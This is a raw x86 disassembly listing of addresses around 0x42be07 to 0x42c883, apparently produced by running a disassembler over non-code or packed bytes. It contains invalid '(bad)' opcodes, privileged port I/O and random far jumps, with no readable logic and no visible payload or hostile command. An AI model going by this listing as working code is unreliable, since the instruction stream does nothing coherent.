  42be07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be08:	neg    ebx
  42be0a:	nop
  42be0b:	aam    0x59
  42be0d:	test   BYTE PTR [edi],ah
  42be0f:	mov    esi,0x8b3f134c
  42be14:	xor    ebp,DWORD PTR [esi]
  42be16:	in     al,dx
  42be17:	mov    eax,?
  42be19:	sbb    esp,edx
  42be1b:	not    bh
  42be1d:	dec    esp
  42be1e:	fwait
  42be1f:	jo     0x42be11
  42be21:	sbb    ebp,DWORD PTR [edx-0x30]
  42be24:	dec    ebp
  42be25:	push   cs
  42be26:	mov    ch,0x98
  42be28:	in     eax,0x50
  42be2a:	cmp    al,0xd4
  42be2c:	push   ecx
  42be2d:	into   
  42be2e:	add    al,0x66
  42be30:	inc    ebp
  42be31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be32:	test   al,0x9
  42be34:	xchg   ecx,eax
  42be35:	jo     0x42be08
  42be37:	push   ecx
  42be38:	xlat   BYTE PTR ds:[ebx]
  42be39:	mov    esi,0xcbe05eb2
  42be3e:	ins    DWORD PTR es:[edi],dx
  42be3f:	sub    ah,BYTE PTR [edx-0x34]
  42be42:	jns    0x42be00
  42be44:	das    
  42be45:	xor    ecx,DWORD PTR [ebx]
  42be47:	test   DWORD PTR [esi+0x4c3c5091],esp
  42be4d:	cmp    BYTE PTR [edx],al
  42be4f:	lahf   
  42be50:	test   dh,ah
  42be52:	sbb    DWORD PTR [ecx-0x6f],ebp
  42be55:	repnz out 0x28,al
  42be58:	lods   eax,DWORD PTR cs:[esi]
  42be5a:	fsubr  DWORD PTR [edi]
  42be5c:	(bad)  
  42be5e:	aaa    
  42be5f:	scas   al,BYTE PTR es:[edi]
  42be60:	cs jae 0x42bec0
  42be63:	pop    ds
  42be64:	mov    WORD PTR [ebp+0x76bd9e0e],?
  42be6a:	push   esp
  42be6b:	pop    es
  42be6c:	mov    ah,0xe5
  42be6e:	adc    DWORD PTR [eax-0x64501531],0xecb219ff
  42be78:	rol    DWORD PTR ds:0xa6520341,1
  42be7e:	xor    al,0x43
  42be80:	sbb    eax,0xb35b4dd
  42be85:	or     DWORD PTR [esi+0xf],esi
  42be88:	rcr    BYTE PTR [ebp+0x1f],1
  42be8b:	and    al,0x38
  42be8d:	xchg   cl,bl
  42be8f:	sbb    BYTE PTR [esi-0x49],al
  42be92:	sub    BYTE PTR [edi-0xd],dh
  42be95:	ss jl  0x42be96
  42be98:	add    eax,0x2a85d473
  42be9d:	outs   dx,BYTE PTR ds:[esi]
  42be9e:	fucomp st(7)
  42bea0:	sbb    ch,cl
  42bea2:	fist   DWORD PTR [ecx+0x77807add]
  42bea8:	inc    esi
  42bea9:	mov    ebp,0x1bb53096
  42beae:	or     DWORD PTR [si+0xa],esi
  42beb2:	push   0x8cd28214
  42beb7:	jl     0x42bf1f
  42beb9:	lods   al,BYTE PTR ds:[esi]
  42beba:	dec    ebx
  42bebb:	pop    edx
  42bebc:	adc    eax,0xf92135e4
  42bec1:	test   BYTE PTR [eax],0x0
	...
  42bf34:	stc    
  42bf35:	enter  0xdc7a,0x7b
  42bf39:	(bad)  
  42bf3a:	(bad)  
  42bf3b:	in     eax,dx
  42bf3c:	out    dx,al
  42bf3d:	mov    ah,0x3
  42bf3f:	dec    ecx
  42bf40:	loope  0x42bf6f
  42bf42:	arpl   WORD PTR [edx+0x1d1f0],sp
  42bf48:	test   BYTE PTR [eax],0x0
  42bf4b:	add    dh,dh
  42bf4d:	and    DWORD PTR [ebp+0x2d],esi
  42bf50:	jmp    FWORD PTR [ecx-0x29]
  42bf53:	mov    edi,0x541eb446
  42bf58:	lods   eax,DWORD PTR ds:[esi]
  42bf59:	pop    es
  42bf5a:	mov    bl,0x6d
  42bf5c:	shr    BYTE PTR [eax],1
  42bf5e:	add    ebp,DWORD PTR [edi+0x35]
  42bf61:	dec    esp
  42bf62:	mov    ch,BYTE PTR [ecx-0x59a3b231]
  42bf68:	ss mov edx,0x61586192
  42bf6e:	int3   
  42bf6f:	nop
  42bf70:	cld    
  42bf71:	rcl    DWORD PTR [edx],1
  42bf73:	mov    cl,0x31
  42bf75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf76:	mov    ch,0x5e
  42bf78:	push   edx
  42bf79:	cwde   
  42bf7a:	aas    
  42bf7b:	pop    esi
  42bf7c:	int3   
  42bf7d:	frstpm(287 only) 
  42bf7f:	pop    ecx
  42bf80:	and    DWORD PTR [edi+eiz*8-0xf],eax
  42bf84:	push   ebx
  42bf85:	mov    edi,0x58c53fe4
  42bf8a:	std    
  42bf8b:	xor    BYTE PTR [edx+0x399e0777],bh
  42bf91:	push   cs
  42bf92:	sbb    esi,0x99d6b071
  42bf98:	xchg   edx,eax
  42bf99:	xor    eax,0xb710bd6f
  42bf9e:	push   0xfffffffc
  42bfa0:	push   0x7e8a9357
  42bfa5:	xor    edi,ebp
  42bfa7:	inc    esi
  42bfa8:	std    
  42bfa9:	imul   ecx,DWORD PTR [esi],0x7f98ce42
  42bfaf:	mov    eax,ds:0xae7177b6
  42bfb4:	jb     0x42c01a
  42bfb6:	stc    
  42bfb7:	or     ch,BYTE PTR [esi+0x34]
  42bfba:	inc    ecx
  42bfbb:	xor    BYTE PTR [edx],cl
  42bfbd:	push   edx
  42bfbe:	retf   0x46e1
  42bfc1:	adc    al,0x1c
  42bfc3:	xor    DWORD PTR [edi+0x12],edx
  42bfc6:	mov    BYTE PTR [edi],dl
  42bfc8:	jne    0x42bfa6
  42bfca:	sub    eax,0x637d2d55
  42bfcf:	idiv   ecx
  42bfd1:	mov    esp,0x9e33c130
  42bfd6:	iret   
  42bfd7:	xchg   BYTE PTR [edx-0x7c],al
  42bfda:	adc    DWORD PTR [ecx+0x50e55ddf],ebx
  42bfe0:	xchg   ebp,eax
  42bfe1:	pop    esp
  42bfe2:	sbb    al,0x86
  42bfe4:	dec    ecx
  42bfe5:	(bad)  
  42bfe6:	sub    eax,0x2d64910c
  42bfeb:	in     eax,dx
  42bfec:	fwait
  42bfed:	and    al,0x5d
  42bfef:	gs test eax,0xf93924b8
  42bff5:	sub    BYTE PTR [edx+0x4bc98eec],ah
  42bffb:	inc    ecx
  42bffc:	and    edx,edx
  42bffe:	mov    edi,0xb60b7286
  42c003:	mov    DWORD PTR [ecx],ecx
  42c005:	and    BYTE PTR ds:0x9e0fb6a5,cl
  42c00b:	mov    dh,BYTE PTR [ecx-0x3d]
  42c00e:	push   es
  42c00f:	pop    es
  42c010:	xor    DWORD PTR [eax-0x14],ebp
  42c013:	jmp    0x4101e6b
  42c018:	cmc    
  42c019:	add    ch,0xb3
  42c01c:	mov    cl,0x0
  42c01e:	pop    edx
  42c01f:	aaa    
  42c020:	les    ebp,FWORD PTR [ecx+0x24]
  42c023:	scas   al,BYTE PTR es:[edi]
  42c024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c025:	cmp    al,BYTE PTR [ebx]
  42c027:	ja     0x42c014
  42c029:	clc    
  42c02a:	pop    ebx
  42c02b:	sub    al,0x99
  42c02d:	lods   eax,DWORD PTR ds:[esi]
  42c02e:	call   0x309f76d1
  42c033:	scas   eax,DWORD PTR es:[edi]
  42c034:	jmp    0xa5be:0x9de72c63
  42c03b:	(bad)  
  42c03c:	shr    BYTE PTR [ebx],cl
  42c03e:	lahf   
  42c03f:	call   0x438afd
	...
  42c0b4:	jne    0x42c0db
  42c0b6:	imul   ebx,DWORD PTR [edi-0x51]
  42c0ba:	cmc    
  42c0bb:	(bad)  
  42c0bc:	call   0xf5942915
  42c0c1:	pop    ss
  42c0c2:	adc    DWORD PTR ds:0x1d2e6,eax
  42c0c8:	test   BYTE PTR [eax],0x0
  42c0cb:	add    cl,al
  42c0cd:	xor    BYTE PTR [eax+0x8710075],ah
  42c0d3:	and    cl,BYTE PTR [eax+0x16696a4f]
  42c0d9:	xor    ebx,DWORD PTR [ebp+0x1c868456]
  42c0df:	ja     0x42c0fb
  42c0e1:	out    dx,eax
  42c0e2:	or     eax,0xc45963f5
  42c0e7:	cli    
  42c0e8:	sub    bh,BYTE PTR [esi-0x54]
  42c0eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c0ec:	xchg   ecx,eax
  42c0ed:	das    
  42c0ee:	jns    0x42c0f0
  42c0f0:	sub    ecx,DWORD PTR [eax-0xe229574]
  42c0f6:	sub    eax,0x58add598
  42c0fb:	das    
  42c0fc:	mov    edi,0x229db59a
  42c101:	and    edx,DWORD PTR [edx-0xb1e1cb2]
  42c107:	(bad)
  42c10a:	fst    DWORD PTR [edi]
  42c10c:	(bad)
  42c110:	addr16 aas 
  42c112:	add    edx,DWORD PTR [ebp-0x1c]
  42c115:	stc    
  42c116:	ins    DWORD PTR es:[edi],dx
  42c117:	xchg   ebx,eax
  42c118:	jge    0x42c144
  42c11a:	mov    al,0x69
  42c11c:	jl     0x42c169
  42c11e:	dec    ecx
  42c11f:	(bad)  
  42c120:	push   ecx
  42c121:	xlat   BYTE PTR ds:[ebx]
  42c122:	cmp    BYTE PTR [ebx+0x16],bh
  42c125:	adc    al,0x97
  42c127:	push   es
  42c128:	jecxz  0x42c0b1
  42c12a:	dec    esp
  42c12b:	pop    eax
  42c12c:	ins    DWORD PTR es:[edi],dx
  42c12d:	sub    al,BYTE PTR [esi+ebp*1-0x39]
  42c131:	push   esp
  42c132:	ret    0x7b7c
  42c135:	aad    0x97
  42c137:	or     BYTE PTR [ebp-0x201c1d66],dl
  42c13d:	mov    ds,WORD PTR [edx-0x7b227bd4]
  42c143:	sbb    ebp,DWORD PTR [ebx]
  42c145:	xchg   ebp,eax
  42c146:	jae    0x42c17b
  42c148:	popa   
  42c149:	inc    ebx
  42c14a:	mov    esi,0xb3c6c34f
  42c14f:	pop    es
  42c150:	lods   eax,DWORD PTR ds:[esi]
  42c151:	dec    esi
  42c152:	mov    eax,0x73821144
  42c157:	pop    ebp
  42c158:	xor    DWORD PTR ss:[ebx+0x5],esi
  42c15c:	mov    dl,0x16
  42c15e:	sub    BYTE PTR [edi+0x69f0f22c],dh
  42c164:	ret    
  42c165:	mov    bh,0x77
  42c167:	sar    dh,1
  42c169:	or     al,0xf0
  42c16b:	shr    DWORD PTR [eax],cl
  42c16d:	mov    eax,0x9109863d
  42c172:	xor    cl,al
  42c174:	mov    edi,0xc00af089
  42c179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c17a:	push   ebp
  42c17b:	or     eax,0xc91df4c
  42c180:	mov    dh,0xbb
  42c182:	mov    ah,0x43
  42c184:	gs dec ecx
  42c186:	retf   0xeb35
  42c189:	test   al,0xa5
  42c18b:	mov    ebp,0x45bd84be
  42c190:	xor    dh,BYTE PTR es:[esi]
  42c193:	and    bh,BYTE PTR [edx]
  42c195:	call   0x2e66:0xf3ce2a08
  42c19c:	cmp    eax,0x3f32ed87
  42c1a1:	into   
  42c1a2:	lods   eax,DWORD PTR ds:[esi]
  42c1a3:	mov    BYTE PTR [esi+edi*2-0x6f3683b5],al
  42c1aa:	sahf   
  42c1ab:	call   0xd3cb4ffd
  42c1b0:	and    DWORD PTR [eax+0x3b],esi
  42c1b3:	sbb    cl,BYTE PTR [edi+0x3bd4889a]
  42c1b9:	add    ch,BYTE PTR [edi+0x5773c7cc]
  42c1bf:	and    DWORD PTR [ebp+0x62],eax
	...
  42c231:	add    BYTE PTR [eax],al
  42c233:	add    BYTE PTR [ebp-0x449f6672],ah
  42c239:	ja     0x42c238
  42c23b:	iret   
  42c23c:	xchg   esp,eax
  42c23d:	xor    edx,DWORD PTR [ecx+ebp*1-0x65]
  42c241:	leave  
  42c242:	push   edi
  42c243:	pop    es
  42c244:	(bad)  
  42c246:	add    DWORD PTR [eax],eax
  42c248:	test   BYTE PTR [eax],0x0
  42c24b:	add    BYTE PTR [ecx-0x37],bh
  42c24e:	dec    ebp
  42c24f:	sbb    al,0xea
  42c251:	leave  
  42c252:	loopne 0x42c22f
  42c254:	sbb    BYTE PTR [ebx-0xf],0x2e
  42c258:	dec    ecx
  42c259:	iret   
  42c25a:	pop    edx
  42c25b:	jno    0x42c1f3
  42c25d:	cld    
  42c25e:	lods   eax,DWORD PTR ds:[esi]
  42c25f:	xchg   esi,eax
  42c260:	ret    0x7254
  42c263:	popa   
  42c264:	aad    0x33
  42c266:	mov    ecx,0xa03ca5c9
  42c26b:	mov    bh,0xa0
  42c26d:	xchg   edi,eax
  42c26e:	add    ecx,ebp
  42c270:	aam    0x2
  42c272:	jmp    0x4bfe:0x7495256d
  42c279:	ret    0xb030
  42c27c:	fcom   st(3)
  42c27e:	jecxz  0x42c2e5
  42c280:	cmp    al,0x1a
  42c282:	pop    esp
  42c283:	mov    ?,WORD PTR [eax+ebp*4]
  42c286:	xchg   esi,eax
  42c287:	pop    esi
  42c288:	call   0x821c:0xea758f18
  42c28f:	push   eax
  42c290:	cdq    
  42c291:	aas    
  42c292:	mov    DWORD PTR ds:0x2adc11f6,esp
  42c298:	repz addr16 cmp eax,0x35e93898
  42c29f:	sub    eax,0xcd18cc7f
  42c2a4:	xor    BYTE PTR [edx+0x6a],dl
  42c2a7:	sbb    bh,BYTE PTR [ebx]
  42c2a9:	mov    ah,0xdd
  42c2ab:	mov    bl,BYTE PTR [edi]
  42c2ad:	inc    ecx
  42c2ae:	mov    bh,BYTE PTR [esp+ecx*1-0x10]
  42c2b2:	retf   
  42c2b3:	out    0xf0,eax
  42c2b5:	fcmovnb st,st(7)
  42c2b7:	xchg   ecx,eax
  42c2b8:	int    0x69
  42c2ba:	mov    bl,0x77
  42c2bc:	xchg   ebx,eax
  42c2bd:	push   0x18
  42c2bf:	into   
  42c2c0:	(bad)
  42c2c3:	adc    eax,0xebd89ee1
  42c2c8:	test   DWORD PTR [ecx+edx*4+0x12fc34cc],ebp
  42c2cf:	xchg   edx,eax
  42c2d0:	mov    ebp,0xecfbb175
  42c2d5:	mov    bl,0x77
  42c2d7:	int3   
  42c2d8:	ds mov al,0xe5
  42c2db:	out    0xb1,al
  42c2dd:	fs jmp 0x2d31:0xad1b97e6
  42c2e5:	js     0x42c308
  42c2e7:	arpl   WORD PTR [ecx+esi*1],bx
  42c2ea:	js     0x42c2c5
  42c2ec:	sbb    esi,eax
  42c2ee:	lahf   
  42c2ef:	sar    BYTE PTR [ebx+0x1e],1
  42c2f2:	sub    dl,BYTE PTR [ebp+0x3b76e3b7]
  42c2f8:	mov    ebx,0xbc9171b2
  42c2fd:	loope  0x42c362
  42c2ff:	pop    di
  42c301:	mov    ebp,0x87111bbd
  42c306:	stc    
  42c307:	call   0xcb37fb46
  42c30c:	daa    
  42c30d:	fiadd  DWORD PTR [ecx+0x6fa763c3]
  42c313:	inc    esi
  42c314:	xlat   BYTE PTR ds:[ebx]
  42c315:	adc    esi,DWORD PTR [edx-0x18]
  42c318:	inc    ebx
  42c319:	shl    DWORD PTR [edi+ebp*2],0x8
  42c31d:	mov    ah,BYTE PTR [ebp-0x39]
  42c320:	push   es
  42c321:	fistp  DWORD PTR [edi]
  42c323:	imul   DWORD PTR [ecx+0x5e]
  42c326:	push   edx
  42c327:	cmp    al,0x32
  42c329:	adc    al,0x4c
  42c32b:	xlat   BYTE PTR ds:[ebx]
  42c32c:	call   0x830a:0xe8f1de93
  42c333:	xchg   esp,ebx
  42c335:	cld    
  42c336:	stos   BYTE PTR es:[edi],al
  42c337:	and    cl,BYTE PTR [ebx+0x5555f7ef]
  42c33d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c33e:	push   0x5bf4bf
	...
  42c3b3:	add    BYTE PTR [edx-0x1011dfbb],cl
  42c3b9:	out    dx,eax
  42c3ba:	into   
  42c3bb:	gs aam 0xa
  42c3be:	fst    DWORD PTR [ecx-0x63]
  42c3c1:	pop    ebx
  42c3c2:	sti    
  42c3c3:	in     eax,dx
  42c3c4:	rcl    ah,cl
  42c3c6:	add    DWORD PTR [eax],eax
  42c3c8:	test   BYTE PTR [eax],0x0
  42c3cb:	add    BYTE PTR [ebx-0x79],cl
  42c3ce:	in     al,0x97
  42c3d0:	out    dx,eax
  42c3d1:	fwait
  42c3d2:	punpckhwd mm7,QWORD PTR [esi-0x7be24212]
  42c3d9:	fwait
  42c3da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3db:	add    esi,esi
  42c3dd:	in     eax,0xd4
  42c3df:	xlat   BYTE PTR ds:[ebx]
  42c3e0:	jmp    0x42c367
  42c3e2:	xor    ecx,DWORD PTR [ebx+0x428e5107]
  42c3e8:	jb     0x42c413
  42c3ea:	mov    eax,0xad27658
  42c3ef:	add    al,0x1e
  42c3f1:	mov    dl,BYTE PTR [ecx]
  42c3f3:	scas   al,BYTE PTR es:[edi]
  42c3f4:	dec    edi
  42c3f5:	icebp  
  42c3f6:	sbb    esp,esi
  42c3f8:	stos   DWORD PTR es:[edi],eax
  42c3f9:	inc    ebx
  42c3fa:	fild   QWORD PTR [edi+0x75878703]
  42c400:	shl    DWORD PTR [ecx],1
  42c402:	pop    esi
  42c403:	xor    al,0x78
  42c405:	ss call 0xda93b83b
  42c40b:	mov    cl,0xc9
  42c40d:	les    ecx,FWORD PTR [ebx-0x3e8b140b]
  42c413:	fwait
  42c414:	cdq    
  42c415:	mov    edx,DWORD PTR [eax-0x2c91f32e]
  42c41b:	loop   0x42c3be
  42c41d:	sahf   
  42c41e:	test   DWORD PTR [edi],ebp
  42c420:	jmp    0xb772:0x29aab4e9
  42c427:	ja     0x42c3fa
  42c429:	fidivr WORD PTR [edi]
  42c42b:	or     BYTE PTR [edi-0x3a],dl
  42c42e:	icebp  
  42c42f:	pop    ss
  42c430:	sub    al,0x14
  42c432:	mov    WORD PTR [eax],es
  42c434:	mov    ebp,0x7d19c78e
  42c439:	or     bl,al
  42c43b:	(bad)
  42c43f:	(bad)  
  42c440:	pushf  
  42c441:	sti    
  42c442:	hlt    
  42c443:	in     eax,0x90
  42c445:	inc    esp
  42c446:	in     eax,0xc0
  42c448:	aaa    
  42c449:	jge    0x42c3d3
  42c44b:	sti    
  42c44c:	dec    ecx
  42c44d:	xchg   ecx,eax
  42c44e:	scas   eax,DWORD PTR es:[edi]
  42c44f:	dec    edx
  42c450:	shr    BYTE PTR [eax],0x43
  42c453:	push   eax
  42c454:	aad    0x6f
  42c456:	xchg   edi,eax
  42c457:	sahf   
  42c458:	leave  
  42c459:	ror    BYTE PTR [esi-0x9ce4be3],0x1c
  42c460:	mov    esi,0xe962c7c1
  42c465:	jl     0x42c477
  42c467:	mov    bh,ah
  42c469:	lods   eax,DWORD PTR ds:[esi]
  42c46a:	jp     0x42c3f7
  42c46c:	jge    0x42c404
  42c46e:	and    DWORD PTR [ebx+0x31],0x942f59a6
  42c475:	xchg   ecx,eax
  42c476:	paddusw mm5,QWORD PTR [ebx-0x6e]
  42c47a:	fiadd  DWORD PTR [ecx+0x180b4685]
  42c480:	mov    edx,0x1dfc8903
  42c485:	mov    esp,edx
  42c487:	out    dx,al
  42c488:	pushf  
  42c489:	sti    
  42c48a:	xchg   ebx,eax
  42c48b:	sub    ch,BYTE PTR [eax+0x44]
  42c48e:	mov    ?,WORD PTR ds:0x7724ade5
  42c494:	xor    BYTE PTR [ebp-0x5221aafe],bl
  42c49a:	jge    0x42c505
  42c49c:	sub    al,0x3a
  42c49e:	mov    al,0xc6
  42c4a0:	inc    ecx
  42c4a1:	mov    edx,0xbe408ddf
  42c4a6:	pop    edx
  42c4a7:	sub    bh,al
  42c4a9:	lods   al,BYTE PTR ds:[esi]
  42c4aa:	add    cl,BYTE PTR [ebx-0x5ae55019]
  42c4b0:	xor    edx,esp
  42c4b2:	es or  esi,esi
  42c4b5:	pop    esi
  42c4b6:	stos   BYTE PTR es:[edi],al
  42c4b7:	adc    al,bl
  42c4b9:	cmp    eax,0xdd062ae7
  42c4be:	mul    BYTE PTR [edx+0x6f]
  42c4c1:	test   BYTE PTR [eax],al
	...
  42c533:	add    al,ah
  42c535:	xchg   esp,eax
  42c536:	and    bh,cl
  42c538:	je     0x42c539
  42c53a:	out    dx,eax
  42c53b:	mov    edi,0x9a7cd6c5
  42c540:	jge    0x42c593
  42c542:	out    dx,al
  42c543:	test   al,cl
  42c545:	aad    0x1
  42c547:	add    dh,dh
  42c549:	add    BYTE PTR [eax],al
  42c54b:	add    dl,ch
  42c54d:	and    al,0x93
  42c54f:	sahf   
  42c550:	cmp    eax,0x3d133046
  42c555:	push   cs
  42c556:	cli    
  42c557:	lods   al,BYTE PTR ds:[esi]
  42c558:	cmp    al,BYTE PTR [esi+0x3f]
  42c55b:	shl    dh,cl
  42c55d:	pusha  
  42c55e:	jle    0x42c5c8
  42c560:	jae    0x42c4f7
  42c562:	loop   0x42c5aa
  42c564:	jmp    FWORD PTR [edi+0xc9d49cc]
  42c56a:	jbe    0x42c4f1
  42c56c:	xchg   edi,eax
  42c56d:	and    ebx,DWORD PTR [edx]
  42c56f:	pop    ebp
  42c570:	arpl   WORD PTR [esp+ebx*2],bp
  42c573:	jp     0x42c5ca
  42c575:	or     al,0xde
  42c577:	jmp    0xaf0cd3a
  42c57c:	cmp    eax,0x238d5bbc
  42c581:	push   eax
  42c582:	and    DWORD PTR [edx],ebx
  42c584:	jne    0x42c5dd
  42c586:	sub    ah,ch
  42c588:	mov    ch,dl
  42c58a:	or     eax,0xc0b3b4e3
  42c58f:	cld    
  42c590:	xchg   edx,eax
  42c591:	xchg   BYTE PTR ds:0xc22890b8,ch
  42c597:	add    DWORD PTR [esi+0x7],0x4
  42c59b:	add    BYTE PTR [ebx-0x1c],ch
  42c59e:	js     0x42c544
  42c5a0:	shl    edx,0xde
  42c5a3:	and    BYTE PTR [ebx+0x32cf9a],al
  42c5a9:	jbe    0x42c5b3
  42c5ab:	lods   eax,DWORD PTR ds:[esi]
  42c5ac:	fcom   DWORD PTR [edx+0x4d]
  42c5af:	fidivr WORD PTR [eax-0x7c46ee91]
  42c5b5:	xchg   BYTE PTR [esi+0x6a959420],dl
  42c5bb:	push   ds
  42c5bc:	mov    cl,0xc0
  42c5be:	imul   BYTE PTR [edx-0x45524ce4]
  42c5c4:	(bad)  
  42c5c5:	and    ch,BYTE PTR [edx+0x26]
  42c5c8:	cmp    BYTE PTR [ebp+0x711ba62d],dh
  42c5ce:	cdq    
  42c5cf:	lea    esp,[ecx-0x11]
  42c5d2:	cwde   
  42c5d3:	test   DWORD PTR [ebx],esi
  42c5d5:	xchg   ecx,eax
  42c5d6:	mov    eax,ds:0x88ae8e76
  42c5db:	mov    dh,0xe6
  42c5dd:	aad    0x66
  42c5df:	pop    edi
  42c5e0:	es int 0xa0
  42c5e3:	icebp  
  42c5e4:	dec    ebp
  42c5e5:	in     al,dx
  42c5e6:	xchg   esp,eax
  42c5e7:	dec    edx
  42c5e8:	pop    ebp
  42c5e9:	and    ebx,0xf0e698c0
  42c5ef:	lea    ebp,[ebx]
  42c5f1:	imul   ecx,esp,0x3d
  42c5f4:	idiv   dh
  42c5f6:	loopne 0x42c5dd
  42c5f8:	out    0xa5,eax
  42c5fa:	call   0x3699dc93
  42c5ff:	leave  
  42c600:	sub    dl,BYTE PTR [esi-0x50]
  42c603:	mov    eax,ds:0x830f4315
  42c608:	mov    ah,BYTE PTR [edi-0x78]
  42c60b:	mov    BYTE PTR [edx-0x7],al
  42c60e:	adc    eax,0xe654a4fe
  42c613:	pop    edi
  42c614:	mov    ecx,0xe3e32278
  42c619:	in     al,0x3e
  42c61b:	mov    bh,0x98
  42c61d:	rcr    DWORD PTR [edx],cl
  42c61f:	push   ds
  42c620:	adc    cl,cl
  42c622:	sar    edx,0x13
  42c625:	fcom   QWORD PTR [ebx+0x391b23f7]
  42c62b:	jmp    0x92593f1e
  42c630:	aas    
  42c631:	xor    eax,0x40f9e24
  42c636:	lea    esp,[ebp+0x1da160c9]
  42c63c:	xchg   ebx,eax
  42c63d:	mov    ds:0x70fb902e,eax
	...
  42c6b2:	add    BYTE PTR [eax],al
  42c6b4:	dec    esi
  42c6b5:	inc    edx
  42c6b6:	dec    ecx
  42c6b7:	daa    
  42c6b8:	dec    ebp
  42c6b9:	das    
  42c6ba:	outs   dx,BYTE PTR ds:[esi]
  42c6bb:	imul   ebp,esi,0x7b
  42c6be:	enter  0x9ebe,0xe2
  42c6c2:	ins    DWORD PTR es:[edi],dx
  42c6c3:	aad    0xbe
  42c6c5:	(bad)  
  42c6c6:	add    DWORD PTR [eax],eax
  42c6c8:	test   BYTE PTR [eax],0x0
  42c6cb:	add    BYTE PTR [esi],ah
  42c6cd:	aas    
  42c6ce:	xchg   cl,dl
  42c6d0:	jo     0x42c6ff
  42c6d2:	inc    eax
  42c6d3:	xor    eax,0x506349d0
  42c6d8:	(bad)  
  42c6d9:	jl     0x42c67e
  42c6db:	ja     0x42c6ef
  42c6dd:	dec    edi
  42c6de:	mov    eax,0x54cf0dc7
  42c6e3:	popa   
  42c6e4:	(bad)  
  42c6e5:	pcmpgtb mm1,QWORD PTR [ecx]
  42c6e8:	cli    
  42c6e9:	mov    al,BYTE PTR [edx]
  42c6eb:	xor    esp,DWORD PTR [ecx+0x296e7f5e]
  42c6f1:	xor    ebp,esp
  42c6f3:	lahf   
  42c6f4:	call   0x9b75e34
  42c6f9:	ins    DWORD PTR es:[edi],dx
  42c6fa:	sub    dh,cl
  42c6fc:	sbb    bl,ch
  42c6fe:	pop    esp
  42c6ff:	sub    BYTE PTR [edi-0x3b],bl
  42c702:	xchg   edi,ebx
  42c704:	mov    al,0x9
  42c706:	cmp    al,0xdc
  42c708:	sbb    al,0x68
  42c70a:	mov    al,ds:0xec8db7f9
  42c70f:	xchg   edx,eax
  42c710:	jle    0x42c6a4
  42c712:	fcmovb st,st(6)
  42c714:	sti    
  42c715:	stos   BYTE PTR es:[edi],al
  42c716:	pop    es
  42c717:	pop    edx
  42c718:	xor    DWORD PTR [edx-0x2a],esi
  42c71b:	cld    
  42c71c:	cmp    dh,dh
  42c71e:	lods   eax,DWORD PTR ds:[esi]
  42c71f:	(bad)  
  42c720:	pop    ecx
  42c721:	rol    al,0x5a
  42c724:	test   DWORD PTR [ebx],ecx
  42c726:	test   DWORD PTR [ecx+0x45],esi
  42c729:	xor    BYTE PTR [ebx],ah
  42c72b:	or     eax,0x5db77534
  42c730:	es ins BYTE PTR es:[edi],dx
  42c732:	pop    esi
  42c733:	repnz into 
  42c735:	and    bh,BYTE PTR [ebp+0x66]
  42c738:	aaa    
  42c739:	push   ebx
  42c73a:	adc    eax,esp
  42c73c:	sbb    al,dh
  42c73e:	sub    bh,al
  42c740:	mov    dh,0x91
  42c742:	mov    eax,0x62084910
  42c747:	loope  0x42c772
  42c749:	jmp    0x37dd:0x9167a194
  42c750:	call   0x8a13:0x95646d86
  42c757:	xor    bl,BYTE PTR [ebp-0x3e]
  42c75a:	jle    0x42c6dd
  42c75c:	or     ebp,DWORD PTR [esi+0x62]
  42c75f:	dec    edx
  42c760:	push   eax
  42c761:	jns    0x42c7da
  42c763:	retf   
  42c764:	or     BYTE PTR [esi-0x6a0df092],ah
  42c76a:	or     eax,0xe2314055
  42c76f:	shl    DWORD PTR [esi+0x1],0x40
  42c773:	std    
  42c774:	sti    
  42c775:	sub    edx,DWORD PTR [edi-0x1514db3]
  42c77b:	out    dx,eax
  42c77c:	int    0xab
  42c77e:	clc    
  42c77f:	in     al,0xa6
  42c781:	jae    0x42c7d2
  42c783:	add    BYTE PTR [edx],0x49
  42c786:	mov    eax,ds:0xcbb96fcb
  42c78b:	sbb    BYTE PTR [esi-0x32],0x8e
  42c78f:	and    al,0x39
  42c791:	je     0x42c7de
  42c793:	xor    eax,0x401fbafd
  42c798:	mov    edi,0x7624a6f6
  42c79d:	mov    ebp,0xc971a706
  42c7a2:	jbe    0x42c821
  42c7a4:	repz scas eax,DWORD PTR es:[edi]
  42c7a6:	xlat   BYTE PTR ds:[ebx]
  42c7a7:	sub    al,0x94
  42c7a9:	xor    al,0x1f
  42c7ab:	xchg   edx,eax
  42c7ac:	fistp  WORD PTR [ebx+0x4d]
  42c7af:	ins    BYTE PTR es:[edi],dx
  42c7b0:	inc    ebx
  42c7b1:	mov    dh,0xd9
  42c7b3:	xchg   esp,eax
  42c7b4:	aaa    
  42c7b5:	imul   esp,ebx,0x33
  42c7b8:	push   esi
  42c7b9:	adc    al,BYTE PTR [ecx]
  42c7bb:	and    cl,BYTE PTR [edx-0x168b3695]
  42c7c1:	rol    BYTE PTR [eax],0x0
	...
  42c834:	call   0x2a86d6
  42c839:	out    0xf9,eax
  42c83b:	lahf   
  42c83c:	or     ch,bh
  42c83e:	fdiv   DWORD PTR ds:0xf6cd95e2
  42c844:	mov    ah,0xd7
  42c846:	add    DWORD PTR [eax],eax
  42c848:	test   BYTE PTR [eax],0x0
  42c84b:	add    BYTE PTR [ecx-0x2],bl
  42c84e:	dec    ebp
  42c84f:	jp     0x42c869
  42c851:	cdq    
  42c852:	popf   
  42c853:	lods   eax,DWORD PTR ds:[esi]
  42c854:	adc    cl,BYTE PTR [edi-0x6a4435d1]
  42c85a:	loopne 0x42c847
  42c85c:	retf   0xb94d
  42c85f:	dec    ebp
  42c860:	fisttp DWORD PTR [ebp+0x2f024aae]
  42c866:	pop    ds
  42c867:	add    BYTE PTR [edx-0x16],al
  42c86a:	test   BYTE PTR [ecx+0x47],dl
  42c86d:	or     dl,dh
  42c86f:	aaa    
  42c870:	dec    edx
  42c871:	stc    
  42c872:	mov    eax,ds:0xe07e216b
  42c877:	ja     0x42c80e
  42c879:	adc    DWORD PTR [ecx],0x5
  42c87c:	push   ecx
  42c87d:	mov    bl,0xde
  42c87f:	ffree  st(0)
  42c881:	adc    al,bh
  42c883:	out    0x6b,al
